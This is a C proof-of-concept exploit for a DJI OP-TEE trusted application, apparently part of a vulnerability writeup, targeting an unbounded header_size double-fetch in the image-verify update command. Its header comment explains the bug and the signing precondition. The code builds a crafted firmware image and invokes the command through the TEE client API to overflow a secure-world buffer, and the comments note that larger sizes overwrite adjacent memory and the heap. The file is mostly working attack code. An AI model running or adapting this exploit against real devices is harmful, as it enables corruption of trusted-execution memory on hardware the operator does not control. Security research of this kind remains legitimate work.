/*
 * Normal-world PoC for DJI OP-TEE TA 09db16c0 — BUG 1 (writeup, High):
 * cmd 4 (dji_image_verify_update, FUN_00103d40) — double-fetch / unbounded
 * header_size -> secure-world .bss buffer overflow of the 0x4f8-byte verify
 * context DAT_001211f8.
 *
 *   first-update path (after a verify session is initialised):
 *     if (size < header_size + sig_size) return -2;        // header_size read #1
 *     image_verify_common(...);                            // structural (no header_size bound!)
 *     if (image_verify_header(...) != 0) return -0xe;       // RSA/ECC signature gate
 *     hs = *(int *)(image + 0x10);                          // header_size read #2 (double-fetch)
 *     memcpy(ctx + 0x24, image, hs);                        // <-- SINK: 0x4f8-byte ctx, hs unbounded
 *
 * There is no check header_size <= sizeof(ctx) - 0x24 (== 0x4d4). A header_size
 * larger than that linearly overflows the secure global with attacker image
 * bytes (and, larger still, the adjacent .bss and the TA heap). Here we use a
 * very large header_size so the overflow runs off the end of mapped secure
 * memory -> immediate secure-world data abort (UC_ERR_WRITE_UNMAPPED in the
 * emulator), proving the missing bound.
 *
 * ---- Signature precondition (important) -------------------------------------
 * Per the writeup, the attacker possesses a *legitimately-signed* image (their
 * own device firmware) but no signing keys: they pass verification with a small
 * header_size, then enlarge it. We cannot forge the device's RSA/ECC signature
 * (nor run the key-gated verify-session init) inside the emulator, so the
 * emulator models those preconditions via env vars when launching the TA:
 *
 *   TAEMU_SET_GLOBAL="0x216e8=1"      # verify-state flag a successful init sets
 *   TAEMU_FORCE_RET0="0x2e70,0x3194"  # image_verify_common (its image-name match
 *                                     #   needs a prior key-gated init) and
 *                                     #   image_verify_header (RSA/ECC signature)
 *
 * Note: image_verify_common is stubbed only because its name match depends on a
 * prior successful init; it never bounded header_size, so this does not paper
 * over the bug. See README.md for the exact launch command.
 *
 *   make emulator ; ./poc [header_size]      # default 0x40000
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define TA_UUID    "09db16c0-873b-4fed-b87e-a5d2b86293a2"
#define CMD_UPDATE 4
#define CTX_CAP    0x4d4   /* usable bytes in the verify ctx after +0x24 */

int main(int argc, char **argv)
{
    uint32_t header_size = 0x40000;            /* >> 0x4d4 ; runs off mapped .bss */
    if (argc > 1)
        header_size = (uint32_t)strtoul(argv[1], NULL, 0);

    uint32_t sig_size = 0x100;                 /* matches auth_alg 2 */
    uint32_t img_size = (header_size + sig_size + 0x1000) & ~0x1fu;  /* >= hs+sig, 0x20-aligned */

    uint8_t *img = calloc(1, img_size);
    *(uint32_t *)(img + 0x00) = 0x482a4d49;    /* magic "IM*H"        */
    *(int32_t  *)(img + 0x10) = (int32_t)header_size;  /* header_size (the unbounded field) */
    *(int32_t  *)(img + 0x14) = (int32_t)sig_size;     /* signature_size      */
    *(int16_t  *)(img + 0x24) = 2;             /* auth_alg = 2        */
    *(uint32_t *)(img + 0x9c) = 0;             /* chunk_count = 0     */
    memset(img + 0xc0, 0x41, (img_size > 0x600 ? 0x600 : img_size) - 0xc0);

    TEEC_UUID *uuid = optee_uuid(TA_UUID);
    TEEC_Context context;
    TEEC_Session session;
    uint32_t eo = 0;
    TEEC_Result res;

    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); return 1; }

    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &eo);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, eo);
        TEEC_FinalizeContext_impl(&context);
        return 1;
    }
    printf("[+] session opened to %s\n", TA_UUID);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INPUT,
                                     TEEC_NONE, TEEC_NONE);   /* == 0x17 */
    op.params[0].tmpref.buffer = img;
    op.params[0].tmpref.size   = img_size;
    op.params[1].value.a = 0;          /* chunk flags (param_6) */
    op.params[1].value.b = 0;          /* chunk flags (param_7) */

    printf("[*] InvokeCommand cmd=%d paramTypes=0x%lx img_size=0x%x header_size=0x%x (ctx cap 0x%x)\n",
           CMD_UPDATE, (unsigned long)op.paramTypes, img_size, header_size, CTX_CAP);
    printf("    -> memcpy(verify_ctx+0x24, image, 0x%x) overflows the 0x4f8-byte secure ctx @0x1211f8\n",
           header_size);

    res = TEEC_InvokeCommand_impl(&session, CMD_UPDATE, &op, &eo);
    printf("[*] InvokeCommand returned 0x%08x (err_origin 0x%x)\n", res, eo);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    printf("[+] done\n");
    return 0;
}
